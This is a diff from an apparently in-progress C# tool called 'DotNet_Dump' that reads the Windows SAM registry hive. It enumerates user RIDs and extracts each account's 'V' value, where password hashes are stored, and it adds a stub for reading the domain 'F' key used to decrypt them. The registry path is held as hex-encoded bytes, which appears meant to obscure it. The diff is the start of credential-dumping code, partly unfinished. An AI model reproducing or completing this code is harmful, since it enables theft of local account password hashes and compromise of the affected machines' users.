@@ -93,7 +93,6 @@ namespace DotNet_Dump
         {
             string key = "";
             // SAM\SAM\Domains\Account\Users
-            //string users = "43 6f 6d 70 75 74 65 72 5c 48 4b 45 59 5f 4c 4f 43 41 4c 5f 4d 41 43 48 49 4e 45 5c 53 41 4d 5c 53 41 4d 5c 44 6f 6d 61 69 6e 73 5c 41 63 63 6f 75 6e 74 5c 55 73 65 72 73";
             string users = "53 41 4D 5C 53 41 4D 5C 44 6F 6D 61 69 6E 73 5C 41 63 63 6F 75 6E 74 5C 55 73 65 72 73";
             string[] userBytes = users.Split(' ');
 
@@ -118,7 +117,18 @@ namespace DotNet_Dump
             return key;
         }
 
-        /* Grab user RIDs + their F values
+        static int grabFKey(string fKeyValue)
+        {
+            int status = 1;
+            string path = "SAM\\SAM\\Domains\\Account\\F";
+            RegistryKey fKey = Registry.LocalMachine;
+
+
+
+            return status;
+        }
+
+        /* Grab user RIDs + their V values
          * Input:
          *      uselessVar1 - useless :)
          *      uselessVar2 - useless :)
@@ -138,7 +148,7 @@ namespace DotNet_Dump
                 Debug.WriteLine("Failed to open users key");
             }
 
-            numUsers = users.SubKeyCount - 1; // dont include names
+            numUsers = users.SubKeyCount - 1; // dont include 'Names' key
 
             userRids = new string[numUsers];
 
@@ -161,19 +171,17 @@ namespace DotNet_Dump
                         Debug.WriteLine("user rid is " + user);
                     }
 
-                    //userRids.Append(currUser.Name);
-                    //userRids[index] = currUser.Name;
-                    userRids[index] = user;
+                    byte[] vValue = (byte[]) currUser.GetValue("V");    
 
-                    byte[] fValue = (byte[]) currUser.GetValue("V");
+                    StringBuilder bytes = new StringBuilder();
+                    for (int i = 0; i < vValue.Length; i++)
+                    {
+                        bytes.Append(vValue[i].ToString("x2"));
+                    }
 
-                    //Debug.WriteLine("bytes are " + fValue.ToString());
-                    //Debug.WriteLine("type is " + fValue.GetType()); // byte[]
+                    Debug.WriteLine("bytes are " + bytes.ToString());
 
-                    Debug.WriteLine("converted is " + System.Text.Encoding.UTF8.GetString(fValue));
-
-                    //userValues.Append(currUser.GetValue("F"));          
-                    userValues[index] = currUser.GetValue("F").ToString(); // maybe bytes cast?
+                    userValues[index] = bytes.ToString(); 
 
                     currUser.Close();
 
